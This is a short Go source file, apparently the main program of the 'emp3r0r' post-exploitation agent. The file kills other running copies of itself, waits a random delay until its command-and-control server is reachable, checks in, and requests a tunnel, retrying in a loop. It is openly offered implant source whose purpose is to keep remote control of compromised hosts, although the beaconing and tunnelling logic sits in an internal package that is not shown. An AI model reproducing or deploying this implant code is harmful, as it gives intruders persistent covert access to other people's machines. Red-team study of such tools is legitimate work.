package main

import (
	"fmt"
	"log"
	"os"
	"time"

	"github.com/jm33-m0/emp3r0r/emagent/internal/agent"
)

func main() {
	fmt.Println("emp3r0r agent started")
	log.SetOutput(os.Stderr)

	// kill any running agents
	alive, procs := agent.IsProcAlive("emp3r0r")
	if alive {
		for _, proc := range procs {
			if proc.Pid == os.Getpid() {
				continue
			}
			err := proc.Kill()
			if err != nil {
				log.Println("Failed to kill old emp3r0r", err)
			}
		}
	}

connect:
	if !agent.IsCCOnline() {
		time.Sleep(time.Duration(agent.RandInt(1, 120)) * time.Minute)
	}

	err := agent.CheckIn()
	if err != nil {
		log.Println("CheckIn: ", err)
	}

	err = agent.RequestTun()
	if err != nil {
		log.Println("RequestTun: ", err)
		time.Sleep(5 * time.Second)
		goto connect
	}
}
